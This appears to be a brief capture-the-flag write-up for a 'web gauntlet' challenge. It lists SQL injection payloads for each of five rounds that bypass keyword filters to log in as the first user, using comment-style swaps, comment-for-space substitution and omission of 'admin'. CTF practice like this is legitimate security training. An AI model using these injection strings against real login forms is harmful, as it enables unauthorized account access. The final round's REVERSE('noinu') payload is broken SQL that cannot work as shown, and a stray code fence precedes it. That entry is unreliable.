# web gauntlet

## round 1

Round 1 filters `or`

```1' union select * from users where username='admin'-- ```

## round 2

Round 2 filters `or and like = --`
to fix this we justneed to change the comment and the way we filter down to only admin.  /* works as a comment and i guessed that admin was the first alphabetically and filtered with a less than.  
```1' union select * from users where username<'bdmin'/* ```

## round 3

Round 3 filters `or and = like > < --`

this one blocks spaces so we gotta replace the spaces with comments


```1'/*union*/union/*select*/select/*test*/*/*from*/from/*users*/users/*limit*/limit/*1*/1/*```

## round 4

Round 4 filters `or and = like > < -- admin`

easy fix, just don't log in to admin explicitly and let the limit 1 take care of us

```1'/*union*/union/*select*/select/*test*/*/*from*/from/*users*/users/*limit*/limit/*1*/1/*```

## round 5

Round 5 filters `or and = like > < -- admin union`

````

```1'/*idk*/REVERSE('noinu')/*select*/select/*test*/*/*from*/from/*users*/users/*limit*/limit/*1*/1/*```
